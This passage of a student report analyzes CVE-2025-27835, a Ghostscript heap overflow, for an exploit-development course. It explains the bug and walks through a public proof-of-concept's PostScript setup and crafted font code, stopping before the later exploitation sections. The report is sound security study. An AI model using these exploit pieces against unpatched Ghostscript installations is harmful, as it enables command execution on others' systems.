<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#goal">Goal</a></li>
    <li><a href="#exploit">Exploit</a></li>
    <li><a href="#triggering-conditions">Triggering Conditions</a></li>
    <li><a href="#proof-of-concept-exploit">Proof of Concept Exploit</a></li>
    <li><a href="#ghostscript-internals">Ghostscript Internals</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#global-variable-setup">Global Variable Setup</a></li>
        <li><a href="#main-set-up">Main Set Up</a>
          <ul>
            <li><a href="#font-creation">Font Creation</a></li>
            <li><a href="#full-font-definition-code">Full Font Definition Code</a></li>
            <li><a href="#font-usage">Font Usage</a></li>
            <li><a href="#triggering-the-exploit">Triggering the Exploit</a></li>
          </ul>
        </li>
        <li><a href="#the-exploit">The Exploit</a>
          <ul>
            <li><a href="#done-function-type-confusion-for-arbitrary-reads-and-writes">/DONE Function: Type Confusion For Arbitrary Reads and Writes</a></li>
            <li><a href="#disabling-the-security-flags">Disabling the security flags</a></li>
          </ul>
        </li>
        <li><a href="#next-steps">Next Steps</a></li>
      </ul>
    </li>
    <li><a href="#impact">Impact</a></li>
    <li><a href="#mitigations">Mitigations</a>
      <ul>
        <li><a href="#ghostscript-v10051-official-patch">GhostScript v10.05.1 Official Patch</a></li>
      </ul>
    </li>
    <li><a href="#references">References</a></li>
    <li><a href="#full-proof-of-concept-code">Full Proof of Concept Code</a></li>
  </ul>
</nav>
  </div>
</details>



            
            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        



        <div class="article-content max-w-prose mb-20">
          
<h2 class="relative group">Goal 
    <div id="goal" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#goal" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>This is a report diving into CVE-2025-27835, a vulnerability in Ghostscript that allows for arbitrary command execution. This report was done with the help of members from the UMass Cybersecurity Club (<a
  href="https://lli555.github.io/"
    target="_blank"
  >Lina Li</a>
, <a
  href="https://github.com/MrLarryMan"
    target="_blank"
  >Larry Liu</a>
, <a
  href="https://atch2203.github.io/"
    target="_blank"
  >Alex Tong</a>
, and <a
  href="https://www.linkedin.com/in/shi-katherine/"
    target="_blank"
  >Katherine Shi</a>
) as part of a final group project for the Reverse Engineering &amp; Understanding Exploit Development course.</p>

  
  
  
  



<div
  
    class="flex px-4 py-3 rounded-md" style="background-color: #e63946"
  
  >
  <span
    
      class="ltr:pr-3 rtl:pl-3 flex items-center" style="color: #1d3557"
    
    >
    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>

  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    
    ><strong>We are not claiming to have found this vulnerability, this is just a report of the Proof of Concept exploit code!</strong></span>
</div>

<p>We analyzed CVE-2025-27835, a known buffer overflow vulnerability in Artifex Ghostscript versions prior to 10.05.0 that occurs in line 256 of the <code>psi/zbfont.c</code> file, part of a function that converts font glyphs to Unicode (<code>gs_font_map_glyph_to_unicode</code>). Our objective was to understand the mechanisms involved in the exploit, the choices the author of the exploit made, and attempt to improve upon the supplied exploit.</p>

<h2 class="relative group">Exploit 
    <div id="exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploit" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<img src="./Images/vuln_code.jpg" alt="Excerpt of vulnerable gs_font_map_glyph_to_unicode function in psi/zbfont.c" style="display:block; margin:auto;">
<p>The vulnerability is a buffer overflow that occurs on a memcpy call. The destination buffer is of type unsigned char and allocates space accordingly, but it copies <code>l * sizeof(short)</code> bytes. Since unsigned chars are 1 byte and shorts are 2 bytes in C, a buffer overflow occurs by copying twice the amount of data.</p>
<p>After reviewing the source code, we hypothesize that the developer made the mistake by thinking that the number of bytes needed to represent a UTF-16 character is twice the size of the source string. However, in this function, l is already treated as the number of bytes of the source string. Thus, the function copies twice as much memory as intended, causing a heap overflow.</p>

<h2 class="relative group">Triggering Conditions 
    <div id="triggering-conditions" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#triggering-conditions" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>The exploit happens when specifically crafted fonts are used. Fonts are used in ghostscript to interpret PDF data or render/generate PDFs from text data. When a font is loaded and used, the buffer overflow will occur if:</p>
<ol>
<li>The font has a GlyphNames2Unicode dictionary</li>
<li>The mapping of glyphs is unsuccessful (c == 0)</li>
<li>The font is not a CIDFont (<code>ch</code> != -1)</li>
<li>The GlyphNames2Unicode dictionary must contain the value of <code>ch</code> as an integer key in the dictionary</li>
<li>Key ch in the dictionary gives value v, which is a string</li>
<li>The size of v is smaller than or equal to length (l &lt;= length)</li>
</ol>

<h2 class="relative group">Proof of Concept Exploit 
    <div id="proof-of-concept-exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#proof-of-concept-exploit" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>The full exploit code can be found at the end of this report.</p>
<p>Running the exploit with the provided command will run <code>ls</code>:</p>
<p><code>gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps</code></p>
<img src="./Images/poc_output.jpg" alt="PoC output" style="display:block; margin:auto;">

<h2 class="relative group">Ghostscript Internals 
    <div id="ghostscript-internals" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ghostscript-internals" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Postscript allows you to create your own variables, arrays, strings, and various other types. To manage all the different types, Ghostscript creates a struct for every variable.</p>
<p>Almost everything in Ghostscript (variables, functions, fonts, etc) is of a type struct <code>ref_s</code>, which contains a struct <code>tas_s</code> and union.
The <code>tas_s</code> struct contains two important variables: <code>type_attrs</code> (the type of object it is, i.e. an array, a string, a font, a number, etc) and rsize (the amount of size in bytes it would take to represent the thing in memory).
A 19 field union is also part of the struct, allowing for data of all different types.</p>
<p>Below is the struct definition and an example object of type array (as denoted in the <code>type_attrs</code>). It is of size 32, and its value is simply a pointer to the array. In this exploit we will only deal with strings and arrays. Strings contain a pointer to the string itself, while arrays contain a pointer to an array of <code>ref_s</code> structs (each of which may contain more pointers).</p>
<p><strong>ref_s ptype:</strong>
<img src="./Images/ref_s_ptype.jpeg" alt="ptype output of ref_s variable" style="display:block; margin:auto;"></p>
<p><strong>ref_s example variable:</strong>
<img src="./Images/ref_s_p.jpeg" alt="printing ref_s variable" style="display:block; margin:auto;"></p>
<p>As some extra context, Ghostscript allows for the execution of bash commands, but it is considered unsafe, so by default, the <code>-dSAFER</code> flag is enabled to prevent the execution of arbitrary commands. This flag can be disabled using the <code>-dNOSAFER</code> flag. The main goal of most Ghostscript exploits is to bypass this to achieve command execution. We will see later that this flag corresponds to a specific field in a <code>gs_lib_ctx_core_t</code> struct.</p>
<p>It also uses a similar allocator to dlmalloc, so the header data is inline with the chunks.</p>

<h2 class="relative group">Exploitation 
    <div id="exploitation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploitation" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Global Variable Setup 
    <div id="global-variable-setup" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#global-variable-setup" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Postscript is an interpreted language, therefore, we first need to define a max virtual memory threshold to allocate for the interpreter. The exploit PoC sets this to 500000000</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="mf">500000000</span> <span class="nf">setvmthreshold</span>
</span></span></code></pre></div><p>Next, the author defines two global variables <code>REFIDX</code> and <code>REFOFS</code> with values 249888 and 3248640 respectively, at hardcoded addresses. We’ll see later on the significance of the values to the exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/REFIDX</span> <span class="mf">249888</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/REFOFS</span> <span class="mf">3248640</span> <span class="nf">def</span>
</span></span></code></pre></div><p>Three more global variables are defined below, with <code>STROBJ</code> being a string of size 1000, <code>ARROBJ</code> being an array of size 6250, and <code>OBJARR</code> being an array of size 32. While <code>STROBJ</code> and <code>OBJARR</code> don’t need precise sizes, <code>ARROBJ</code> must be size 6250 so we can search for the malloc chunk header size field once we get arbitrary read/write.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/STROBJ</span> <span class="mf">1000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARROBJ</span> <span class="mf">6250</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/OBJARR</span> <span class="mf">32</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span></code></pre></div><p>Below is a diagram of the initialized objects in memory, and under that is the definition for <code>ref_s</code> definition for reference.</p>
<img src="./Images/drawing1.jpg" alt="diagram of the initialized objects in memory" style="display:block; margin:auto;">
<br />
<img src="./Images/ref_s.jpeg" alt="printing ref_s variable" style="display:block; margin:auto;">
<p>Below, you can see the values of <code>OBJARR</code>, <code>STROBJ</code>, and <code>ARROBJ</code> from top to bottom. Since <code>STROBJ</code> is at the start of <code>OBJARR</code>, the pointer of <code>OBJARR</code> points directly to it. <code>ARROBJ</code> is 16 bytes after that, since <code>sizeof(ref_s)</code> is 16. We can verify these are correct but looking at <code>tas-&gt;rsize</code> since all three variables have distinct sizes.</p>
<p><strong>OBJARR:</strong></p>
<img src="./Images/objarr.jpeg" alt="printing objarr variable in gdb" style="display:block; margin:auto;">
<p><strong>ARROBJ:</strong></p>
<img src="./Images/arrobj.jpeg" alt="printing objarr variable in gdb" style="display:block; margin:auto;">
<p><strong>SRTOBJ:</strong></p>
<img src="./Images/strobj.jpeg" alt="printing objarr variable in gdb" style="display:block; margin:auto;">
<p>The next two lines set the first two elements of <code>OBJARR</code> to <code>STROBJ</code> and <code>ARROBJ</code> respectively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">STROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">1</span> <span class="nf">ARROBJ</span> <span class="nf">put</span>
</span></span></code></pre></div><p>Finally, to conclude the global variable setup, the exploit author declares 4 variables <code>TARGET</code>, <code>MAGIC</code>, <code>STRPTR</code>, and <code>ARRPTR</code> that will be used later.</p>
<p>The full global variable setup is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="mf">500000000</span> <span class="nf">setvmthreshold</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/REFIDX</span> <span class="mf">249888</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/REFOFS</span> <span class="mf">3248640</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/STROBJ</span> <span class="mf">1000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARROBJ</span> <span class="mf">6250</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/OBJARR</span> <span class="mf">32</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">STROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">1</span> <span class="nf">ARROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nv">/TARGET</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/MAGIC</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/STRPTR</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARRPTR</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span></code></pre></div>
<h3 class="relative group">Main Set Up 
    <div id="main-set-up" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#main-set-up" aria-label="Anchor">#</a>
    </span>        
    
</h3>

<h4 class="relative group">Font Creation 
    <div id="font-creation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#font-creation" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>The exploit makes use of a custom Type 1 Font definition and a buffer overflow in the form of the vulnerable <code>memcpy</code> in <code>psi/zbfont.c</code> in order to hijack execution to invoke a call to the custom defined DONE function.</p>
<p>A font program in PostScript is a collection of commands that describe character shapes that can be accessed using the show operator.  Given a font program definition, the PostScript interpreter can render the font in a device-independent manner.</p>
<p>The exploit author makes use of a Type 1 Font, a specific font program consisting of ASCII text, encoded, and encrypted portions. Type 1 Font is defined by a dictionary with many required and optional entries, but we’ll just go over the entries most relevant to the exploit.</p>
<p>In the main function, we create a new font with specific data:</p>
<ul>
<li><code>/FontName</code>: Name of the font</li>
<li><code>/FontType 1</code>: Type 1 font (glpyh-based, standard for scalable fonts)</li>
<li><code>/FontMatrix</code>: Cooridinate transformation matrix ( identity here = no scaling/skewing)</li>
</ul>
<p><code>/Private &lt;&lt; /lenIV -1 /Subrs [ &lt;0E&gt; ] &gt;&gt;</code></p>
<p>Type 1 fonts encrypt their charstrings where <code>lenIV</code> tells the interpreter how many bytes of random prefix to strip before interpreting the glyph data.By setting <code>/lenIV</code> to -1, this disables this setting so charstrings will not be encrypted for this font.</p>
<p><code>/Subrs</code> is usually for local subroutines in charstrings, and is set here as &lt;0E&gt; which is an endchar operator in Type 1 charstrings</p>
<p><code>/Encoding [ /cs0 /cs1 /cs2 ]</code></p>
<p>Defines an array in the font dictionary to obtain the name (and associated commands) of the character to be built. The BuildChar operation (which will, unsurprisingly, construct the custom font character), when called on, will reference the name in /Encoding to build the corresponding key in the <code>/CharStrings</code> dictionary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/CharStrings</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/.notdef</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/cs0</span> <span class="p">{</span> <span class="nf">TEXT</span> <span class="mf">0</span> <span class="mf">1</span> <span class="nf">put</span> <span class="nv">/TARGET</span> <span class="mf">312500</span> <span class="nf">array</span> <span class="nf">def</span> <span class="nf">TARGET</span> <span class="nf">REFIDX</span> <span class="nf">OBJARR</span> <span class="nf">put</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/cs1</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/cs2</span> <span class="p">{</span> <span class="nf">DONE</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span></code></pre></div><p>Defines the behavior or data for each glyph as a dictionary. <code>/CharStrings</code> is one of two encrypted portions in the font program (the other being the <code>/Private</code> dictionary). It contains the encoded commands to draw the outlines of the characters within the font. There are a few interesting things to note about what the exploit author does with <code>/CharStrings</code> in this instance. First, we’ll notice that <code>/.notdef &lt;0E&gt;</code> sets glyph code 0 (a required entry in a valid Type 1 Font) to <code>&lt;0E&gt;</code>, which ensures that when an encoding that does not exist in the font program is called, <code>.notdef</code> will be substituted to give feedback that the glyph does not exist in the font. Next, we see that <code>cs0</code> seems to be setting up some variables:</p>
<p><code>/cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put }</code></p>
<p>Specifically the encoding <code>cs0</code> will place 1 in the 0th index of <code>TEXT</code> (i.e. <code>TEXT[0] = 1</code>), and define an array <code>TARGET</code> where <code>TARGET[REFIDX] = OBJARR</code>. The motivation for <code>TEXT[0] = 1</code> is to set up <code>TEXT</code> such that it encodes a glyph whose name maps to <code>cs0</code>.</p>
<p><code>/cs1 &lt;0E&gt;</code></p>
<p>Similar to <code>/.notdef</code>, allocates the smallest valid character that does nothing (we believe that <code>0e</code> is a reserved endchar operator, but could only find sources on this related to Type 2 Operators). We found that you could edit <code>&lt;0E&gt;</code> and replace it to any number like 3250 and the exploit would still execute properly. We hypothesized that the exploit author simply paired <code>cs1</code> to <code>&lt;0E&gt;</code> for simplicity and guaranteed no operation (endchar) in this case.</p>
<p><code>/cs2 { DONE }</code></p>
<p>This calls the custom defined <code>/DONE</code> function.</p>
<p><code>/WeightVector [1]</code></p>
<p>This option in the font creation doesn&rsquo;t seem to have any effect on the exploit.</p>
<p><code>/$Blend {}</code></p>
<p>This option in the font creation doesn&rsquo;t seem to have any effect on the exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/FontInfo</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/BlendAxisTypes</span> <span class="p">[</span> <span class="nv">/foo</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/BlendDesignPositions</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/BlendDesignMap</span> <span class="p">[[[</span><span class="mf">1</span><span class="p">]]]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/GlyphNames2Unicode</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span></code></pre></div><p>Is another dictionary that contains 4 elements. All except the <code>/GlyphNames2Unicode</code> dictionary seem to be unimportant. <code>/GlyphNames2Unicode</code> is what keeps the mappings from glyphs to actual characters.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/Blend</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontBBox</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span></code></pre></div><p>Is another dictionary that contains 2 elements. Both seem to be unimportant.</p>

<h4 class="relative group">Full Font Definition Code 
    <div id="full-font-definition-code" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#full-font-definition-code" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/Myfont</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontName</span> <span class="nv">/Myfont</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontType</span> <span class="mf">1</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontMatrix</span> <span class="p">[</span><span class="mf">1</span> <span class="mf">0</span> <span class="mf">0</span> <span class="mf">1</span> <span class="mf">0</span> <span class="mf">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="nv">/lenIV</span> <span class="mf">-1</span> <span class="nv">/Subrs</span> <span class="p">[</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span> <span class="p">]</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Decoding</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Encoding</span> <span class="p">[</span> <span class="nv">/cs0</span> <span class="nv">/cs1</span> <span class="nv">/cs2</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/CharStrings</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/.notdef</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs0</span> <span class="p">{</span> <span class="nf">TEXT</span> <span class="mf">0</span> <span class="mf">1</span> <span class="nf">put</span> <span class="nv">/TARGET</span> <span class="mf">312500</span> <span class="nf">array</span> <span class="nf">def</span> <span class="nf">TARGET</span> <span class="nf">REFIDX</span> <span class="nf">OBJARR</span> <span class="nf">put</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs1</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs2</span> <span class="p">{</span> <span class="nf">DONE</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/WeightVector</span> <span class="p">[</span><span class="mf">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/$Blend</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontInfo</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendAxisTypes</span> <span class="p">[</span> <span class="nv">/foo</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendDesignPositions</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendDesignMap</span> <span class="p">[[[</span><span class="mf">1</span><span class="p">]]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/GlyphNames2Unicode</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Blend</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/FontBBox</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span></code></pre></div>
<h4 class="relative group">Font Usage 
    <div id="font-usage" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#font-usage" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>After defining the font, the next step is to use it. In order to do this, the font needs to be built and set as the current font.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nf">.buildfont1</span>
</span></span><span class="line"><span class="cl"><span class="nv">/FONT</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/FONTNAME</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nf">setfont</span>
</span></span></code></pre></div><p>The <code>.buildfont1</code> operator takes a font dictionary from the stack and constructs a font object. The constructed font object is then stored in the variable <code>FONT</code>, and its name is stored in <code>FONTNAME</code>. Finally, <code>FONT</code> is set as the current font using the <code>setfont</code> operator.</p>
<p>After setting the font, the exploit author does more setup in /MAIN. The next lines initializes three strings:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/TEXT</span> <span class="mf">625000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/SOURCE2</span> <span class="mf">4000002</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/SOURCE1</span> <span class="mf">4000002</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span></code></pre></div><p><code>TEXT</code> is a string of size 625000, while <code>SOURCE1</code> and <code>SOURCE2</code> are strings of size 4000002. The sizes of <code>SOURCE1</code> and <code>SOURCE2</code> are important because they will be used to trigger the buffer overflow in the vulnerable <code>memcpy</code> call.</p>
<p>The <code>ref_s</code> variables corresponding to these three local variables are right next to each other in the Postscript virtual memory, and their buffers are at fixed “offsets” from each other (we will see later that these offsets are just padding). The way this looks like in memory, the <code>tas_s</code> struct of each variable will contain the type of the variable (so they all have type string) and the rsize field in each variable’s <code>tas_s</code> struct 625000 or 4000002. The image below is the value of the <code>SOURCE1</code> <code>ref_s</code> variable.</p>
<img src="./Images/p_src2.jpg" alt="printing SOURCE2 ref variable" style="display:block; margin:auto;">
<p><code>SOURCE2 REFOFS &lt;7e12&gt; putinterval</code></p>
<p>The program then calls the Postscript <code>putinterval</code> operator to put the value <code>0x127e</code> at index 3248640 in <code>SOURCE2</code>, which is an important thing to keep in mind for later. This is done in the function <code>do_call_operator</code> with the address of the Postscript function to run, in this case <code>zputinterval</code> with arguments <code>SOURCE1</code>, <code>SOURCE2</code>, and index. The heap has been set up in a deterministic way such that we are able to hardcode the <code>REFOFS</code> value as well, as we will see later. ASLR loads modules at a different address every time, but all important objects are fixed relative to <code>/TARGET</code> (which is the struct object the buffer overflow is targeting) stay the same.</p>
<p>The most important part of the main function is the next line:</p>
<p><code>FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put</code></p>
<p>Translating this to more readable code, it means get the <code>/FontInfo</code> variable from the <code>FONT</code> in which we then get the <code>/GlyphNames2Unicode</code> dictionary from <code>/FontInfo</code> which shortens the code to:</p>
<p><code>/GlyphNames2Unicode 1 SOURCE1 put</code></p>
<p>And all this does is put the variable <code>SOURCE1</code> into the the second mapping of <code>/GlyphNames2Unicode</code>, effectively mapping 1 to <code>SOURCE1</code>, so <code>/GlyphNames2Unicode</code> looks like this after (using this line in our font’s definition instead of using put also works):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/GlyphNames2Unicode</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">	<span class="mf">1</span> <span class="nf">SOURCE1</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span></code></pre></div><p>So the glyph for 1, which is <code>cs1</code>, will be mapped to <code>SOURCE1</code>. This is important because this mapping NEEDS to be this specifically for the exploit to work or else the buffer is incorrectly written.</p>
